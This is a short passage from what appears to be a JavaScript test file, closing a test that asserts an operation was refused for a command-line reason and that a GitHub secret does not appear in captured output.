    assert.equal(r.outcome, 'refused');
    assert.match(r.reason ?? '', /command line/);
    assertNoSecret(seen.join(''), GH);
  });
});
